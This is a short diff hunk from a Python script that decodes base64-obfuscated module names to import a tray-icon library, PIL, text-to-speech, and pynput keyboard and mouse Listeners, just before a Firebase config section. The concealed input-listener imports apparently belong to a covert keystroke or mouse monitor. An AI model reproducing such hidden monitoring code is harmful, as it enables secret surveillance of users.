@@ -34,8 +34,8 @@ _pystray    = __import__(_d('cHlzdHJheQ=='))
 _PIL_Image  = __import__(_d('UElMLkltYWdl'))
 _PIL_Draw   = __import__(_d('UElMLkltYWdlRHJhdw=='))
 _PIL_Font   = __import__(_d('UElMLkltYWdlRm9udA=='))
-_pynput_kb  = __import__(_d('cHlucHV0LmtleWJvYXJk'))
-_pynput_mouse = __import__(_d('cHlucHV0Lm1vdXNl'))
+_pynput_kb = __import__(_d('cHlucHV0LmtleWJvYXJk'), fromlist=['Listener'])
+_pynput_mouse = __import__(_d('cHlucHV0Lm1vdXNl'), fromlist=['Listener'])
 _pyttsx3    = __import__(_d('cHl0dHN4Mw=='))
 
 # ---- КОНФИГ FIREBASE ----
